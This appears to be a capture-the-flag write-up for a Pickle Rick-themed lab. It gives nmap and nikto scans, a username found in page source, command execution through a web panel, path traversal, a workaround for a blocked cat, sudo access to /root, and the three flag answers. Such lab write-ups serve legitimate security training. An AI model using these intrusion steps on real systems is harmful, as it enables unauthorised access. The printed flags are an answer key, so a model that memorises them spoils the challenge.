```html
  <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
  ```
  we see the username in the source code

we open burp and we see PHPSESSID which tells that server is running on PHP

then check Wappalyzer
- we do /robots.txt 
`Wubbalubbadubdub`
we get this

- do nmap scan 
```bash
$ nmap -p- 10.10.102.55 -v 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-08 09:48 IST
Initiating Ping Scan at 09:48
Scanning 10.10.102.55 [2 ports]
Completed Ping Scan at 09:48, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:48
Completed Parallel DNS resolution of 1 host. at 09:48, 9.01s elapsed
Initiating Connect Scan at 09:48
Scanning 10.10.102.55 [65535 ports]
Discovered open port 22/tcp on 10.10.102.55
Discovered open port 80/tcp on 10.10.102.55
Increasing send delay for 10.10.102.55 from 0 to 5 due to 42 out of 138 dropped probes since last increase.
Increasing send delay for 10.10.102.55 from 5 to 10 due to 11 out of 16 dropped probes since last increase.
```
we see open ports at 22 and 80 
now we scan those ports particularly
```bash
$ nmap -p22,80 10.10.102.55   
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-08 09:50 IST
Nmap scan report for 10.10.102.55
Host is up (0.17s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
```
we see ssh on 22
- Nikto is a web server scanner. 
```bash
$ nikto -h 10.10.102.55   
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.102.55
+ Target Hostname:    10.10.102.55
+ Target Port:        80
+ Start Time:         2023-12-08 09:52:22 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
```

we get login.php from this, so do login.php we get command line ( we can also use gobuster for this )
- now do ls we see `Sup3rS3cretPickl3Ingred.txt`
cat doesn't work, but less and tac work
so do `tac Sup3rS3cretPickl3Ingred.txt` to get the first ingredient - `mr. meeseek hair`

- `ls ../../../` gives the list of directories
we check home
`ls ../../../home` we find 2 directories and do rick, `ls ../../../home/rick`
now do `tac ../../../home/rick/"second ingredients"` to get the second ingredient -
`1 jerry tear`

- do `sudo -l` to see commands
then check root directory by doing `sudo ls /root` or `sudo ls ../../../root`
we see 3rd.txt, run `sudo tac /root/3rd.txt` to get the third ingredient - `fleeb juice`
